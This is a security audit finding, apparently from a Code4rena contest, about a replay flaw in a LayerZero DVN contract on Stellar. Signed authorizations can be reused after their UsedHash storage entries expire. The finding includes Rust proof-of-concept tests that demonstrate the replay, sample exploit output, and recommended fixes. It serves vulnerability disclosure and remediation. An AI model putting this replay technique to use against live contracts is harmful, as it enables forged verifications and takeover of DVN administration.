# [H-01] DVN Replay Attack via `UsedHash` TTL Expiry — Signed Authorization Can Be Re-Executed After Persistent Storage Eviction

---

> **Severity:** 🔴 HIGH  
> **Target Contract:** `contracts/protocol/stellar/contracts/workers/dvn/src/auth.rs`  
> **Storage File:** `contracts/protocol/stellar/contracts/workers/dvn/src/storage.rs`  
> **Attack Cost:** Zero tokens — requires only a 30-day wait  
> **Recoverability:** Partial — replay window is 30 days wide per signed payload  
> **Chain Exploitable:** ✅ Yes — can be chained with PoC 2 (Nonce DoS) for catastrophic impact

---

## Executive Summary

The DVN contract implements replay protection by recording consumed authorization hashes in Soroban **persistent storage** under the key `DvnStorage::UsedHash`. However, persistent storage entries in Soroban carry a finite **Time-To-Live (TTL)** — defaulting to approximately 30 days (518,400 ledgers at 5 s/ledger). The `__check_auth` function places **no upper bound** on the caller-supplied `expiration` timestamp.

This creates a silent, exploitable gap: a signed authorization with `expiration = now + 60 days` (a perfectly normal operational value) remains cryptographically valid long after its corresponding `UsedHash` entry has been silently evicted from storage and reverted to its default value of `false`. An attacker who possesses the original signed payload can replay it exactly — bypassing replay protection entirely — and execute the authorized DVN call a second time.

**The invariant explicitly violated:** *"DVN cannot suffer a replay attack."*

---

## Critical Impact

This vulnerability enables replay of previously authorized DVN actions, violating the invariant that DVN signatures are single-use.

An attacker who successfully replays an expired `UsedHash` can:

- **Re-execute privileged DVN operations** — including admin rotation, DVN pause, and message verification calls — without any fresh signature from the legitimate signers.
- **Forge LayerZero message verifications** — by replaying a previously valid `verify()` authorization, an attacker can cause the endpoint to accept messages that were never legitimately verified in the current context.
- **Chain with PoC 2 (PendingNonces Window Exhaustion)** — a replayed DVN authorization provides zero-cost access to the `verify()` call path, allowing an attacker to inject out-of-order nonces and permanently brick an OApp messaging channel without spending any tokens.
- **Rotate administrators or pause the DVN** — if the replayed payload authorized an admin action, it can be re-executed with identical effect, permanently compromising the DVN's trust model.

This directly breaks the protocol's trust model: the security of every OApp path that relies on this DVN collapses to the question of whether an attacker has access to any previously observed signed payload — a low bar given that payloads are broadcast on-chain.

---

## Vulnerability Details

### Root Cause

`__check_auth` relies on three sequential checks:

```
1. hash = hash_call_data(vid, expiration, calls)
2. used_hash(hash) → must be false  (replay guard)
3. set_used_hash(hash, true)         (mark consumed)
```

The storage key responsible for the replay guard is declared as:

```rust
#[persistent(bool)]
#[default(false)]
UsedHash { hash: BytesN<32> },
```

`#[persistent]` in Soroban means the entry lives in persistent storage with a TTL. After that TTL expires, the entry is **silently evicted** and `used_hash()` returns the declared default: `false`.

The expiration check in `__check_auth` is:

```rust
if expiration <= env.ledger().timestamp() {
    return Err(DvnError::AuthDataExpired);
}
```

There is **no enforcement** that `expiration` must be less than `now + TTL(UsedHash)`. A caller may freely set `expiration` to `now + 60 days`, `now + 365 days`, or even `u64::MAX` — and the contract will accept it.

### The Two Independent Clocks

| Clock | Type | Controlled By | Value |
|---|---|---|---|
| `expiration` | Unix timestamp (u64) | **Caller / Attacker** | Unbounded |
| `UsedHash` TTL | Ledger sequence delta | **Soroban runtime** | ~30 days |

These two timers are **completely decoupled**. The protocol assumes they stay aligned — they do not.

### Attack Window Calculation

```
Signature valid for:   expiration - now           = e.g. 60 days
UsedHash lives for:    ~518,400 ledgers            = ~30 days
Replay window:         60 days - 30 days           = 30 days
```

Any signed payload where `expiration > TTL(UsedHash)` creates a replay window of `expiration - TTL` days.

---

## Attack Scenario (Step-by-Step)

```
Step 1 │ Attacker observes a valid multisig-signed TransactionAuthData
       │ in the mempool, a leaked relay database, or a compromised node.
       │ The signature has expiration = now + 60 days.
       │
Step 2 │ The authorized call executes legitimately on first use.
       │ UsedHash is written to persistent storage.
       │
Step 3 │ Immediate replay is correctly blocked → HashAlreadyUsed.
       │
Step 4 │ Attacker waits 30+ days (or deliberately under-funds storage
       │ rent to accelerate TTL decay).
       │
Step 5 │ UsedHash entry evicts from persistent storage.
       │ used_hash() now returns false (the declared default).
       │
Step 6 │ Attacker replays the EXACT same TransactionAuthData payload.
       │ __check_auth:
       │   ✅ VID valid
       │   ✅ expiration not yet passed  (still 30 days remaining)
       │   ✅ used_hash() == false       (entry evicted → default)
       │   → Authorization ACCEPTED
       │
Step 7 │ Attacker can:
       │   • Re-execute arbitrary DVN calls
       │   • Forge LayerZero message verifications (chains with PoC 2)
       │   • Rotate admins or pause the DVN
```

---

## Proof of Concept

### File Placement

```
Copy to:
  contracts/protocol/stellar/contracts/workers/dvn/src/tests/poc1_dvn_replay_ttl.rs

Add to mod.rs:
  pub mod poc1_dvn_replay_ttl;

Run:
  cd contracts/protocol/stellar
  cargo test poc1_ -- --nocapture
```

### PoC 1-A — Full Replay Exploit

```rust
#[test]
fn poc1a_dvn_replay_attack_after_used_hash_ttl_expires() {
    // ── Setup ────────────────────────────────────────────────────────────────
    let admin = Ed25519Admin::generate();
    let setup = TestSetup::with_admin_bytes(1, std::vec![admin.bytes()]);
    let env   = setup.env.clone();
    let dvn   = LzDVNClient::new(&env, &setup.contract_id);

    // expiration = now + 60 days (UsedHash TTL is only 30 days)
    const SIXTY_DAYS: u64 = 60 * 24 * 3600;
    let expiration = env.ledger().timestamp() + SIXTY_DAYS;

    let (auth_contexts, calls) = make_set_paused_context(&env, &setup.contract_id);
    let sig_payload  = BytesN::from_array(&env, &[0x42u8; 32]);
    let hash         = dvn.hash_call_data(&VID, &expiration, &calls);
    let multisig_sig = setup.key_pairs[0].sign_bytes(&env, &hash);
    let admin_sig    = admin.sign(&env, &sig_payload);

    let auth = TransactionAuthData {
        vid: VID,
        expiration,
        signatures: vec![&env, multisig_sig],
        sender: Sender::Admin(admin.public_key(&env), admin_sig),
    };

    // Step 1: Legitimate first use — must succeed
    let r1 = env.try_invoke_contract_check_auth::<DvnError>(
        &setup.contract_id, &sig_payload, auth.clone().into_val(&env), &auth_contexts,
    );
    assert!(r1.is_ok(), "First auth must succeed");

    // Step 2: Immediate replay — must be blocked
    let r2 = env.try_invoke_contract_check_auth::<DvnError>(
        &setup.contract_id, &sig_payload, auth.clone().into_val(&env), &auth_contexts,
    );
    assert_eq!(r2, Err(Ok(DvnError::HashAlreadyUsed)), "Immediate replay must fail");

    // Step 3: Read UsedHash TTL and advance ledger past it
    let used_hash_key = crate::storage::DvnStorage::UsedHash {
        hash: dvn.hash_call_data(&VID, &expiration, &calls),
    };
    let (entry_ttl, current_seq) = env.as_contract(&setup.contract_id, || {
        (env.storage().persistent().get_ttl(&used_hash_key), env.ledger().sequence())
    });
    env.ledger().set_sequence_number(current_seq + entry_ttl + 1);

    // Confirm eviction
    let still_present = env.as_contract(&setup.contract_id, || {
        env.storage().persistent().has(&used_hash_key)
    });
    assert!(!still_present, "UsedHash must have expired from storage");

    // Step 4: EXPLOIT — replay after TTL expiry
    let r3 = env.try_invoke_contract_check_auth::<DvnError>(
        &setup.contract_id, &sig_payload, auth.into_val(&env), &auth_contexts,
    );

    // ✅ EXPLOIT CONFIRMED: replay is accepted after TTL expiry
    assert!(
        r3.is_ok(),
        "EXPLOIT: replay must be accepted after UsedHash TTL expires."
    );
}
```

### PoC 1-B — No Upper Bound: `u64::MAX` Accepted

```rust
#[test]
fn poc1b_dvn_accepts_u64_max_expiration_no_upper_bound() {
    let admin = Ed25519Admin::generate();
    let setup = TestSetup::with_admin_bytes(1, std::vec![admin.bytes()]);
    let env   = setup.env.clone();
    let dvn   = LzDVNClient::new(&env, &setup.contract_id);

    // expiration = u64::MAX — year 584,554 — impossible to expire by real time
    let expiration = u64::MAX;

    let (auth_contexts, calls) = make_set_paused_context(&env, &setup.contract_id);
    let sig_payload  = BytesN::from_array(&env, &[0x99u8; 32]);
    let hash         = dvn.hash_call_data(&VID, &expiration, &calls);
    let multisig_sig = setup.key_pairs[0].sign_bytes(&env, &hash);
    let admin_sig    = admin.sign(&env, &sig_payload);

    let auth = TransactionAuthData {
        vid: VID, expiration,
        signatures: vec![&env, multisig_sig],
        sender: Sender::Admin(admin.public_key(&env), admin_sig),
    };

    let result = env.try_invoke_contract_check_auth::<DvnError>(
        &setup.contract_id, &sig_payload, auth.into_val(&env), &auth_contexts,
    );

    // ✅ CONFIRMED: u64::MAX accepted — no upper-bound check exists
    assert!(
        result.is_ok(),
        "u64::MAX expiration ACCEPTED — upper-bound check is absent."
    );
}
```

### Expected Output

```
╔══════════════════════════════════════════════════════════╗
║  PoC 1-A: DVN Replay via UsedHash TTL Expiry (HIGH)     ║
╚══════════════════════════════════════════════════════════╝
[+] Step 1 — legitimate use ACCEPTED ✓
[+] Step 2 — immediate replay BLOCKED ✓ (HashAlreadyUsed)
[*] Step 3 — UsedHash TTL: ~30.0 days
[*]          Signature valid: 60 more days
[*]          REPLAY WINDOW: ~30.0 days after TTL expiry
[+] Step 3 — UsedHash confirmed GONE from persistent storage ✓
[!] Step 4 — REPLAY RESULT: Ok(())
╔══════════════════════════════════════════════════════════╗
║  EXPLOIT CONFIRMED — replay ACCEPTED                     ║
║  Invariant VIOLATED: DVN cannot suffer replay            ║
╚══════════════════════════════════════════════════════════╝
```

---

## Impact

| Impact Dimension | Detail |
|---|---|
| **Confidentiality** | Attacker can forge LayerZero message verifications |
| **Integrity** | Arbitrary DVN calls re-executed without fresh signatures |
| **Availability** | DVN can be paused or admin-rotated via replayed payload |
| **Economic** | Zero cost to execute — only time required |
| **Blast Radius** | Every DVN path whose `expiration > TTL(UsedHash)` |
| **Chain Impact** | Directly enables PoC 2 zero-cost nonce window exhaustion |

---

## Recommended Fix

### Option A — Cap `expiration` at Encoding Time (Recommended)

Add the following check inside `__check_auth` **before** the standard expiration check:

```rust
// Maximum allowed expiration offset: strictly less than UsedHash TTL
const MAX_EXPIRATION_OFFSET: u64 = 29 * 24 * 3600; // 29 days < 30-day TTL

if expiration > env.ledger().timestamp() + MAX_EXPIRATION_OFFSET {
    return Err(DvnError::ExpirationTooFar);
}
```

### Option B — Extend TTL on Each Auth Check

Whenever a `UsedHash` entry is read and confirmed to be `true`, explicitly bump its TTL to prevent eviction:

```rust
if DvnStorage::used_hash(env, &hash) {
    // Extend TTL to prevent eviction while the signature is still valid
    env.storage().persistent().extend_ttl(&used_hash_key, MIN_TTL, MAX_TTL);
    return Err(DvnError::HashAlreadyUsed);
}
```

### Option C — Use a Monotonic Nonce Model

Replace the TTL-bound hash model with a per-VID monotonic nonce that cannot silently reset to a default, eliminating the storage-expiry attack surface entirely.

---

*Submitted to Code4rena — LayerZero Stellar Protocol Audit 2026*
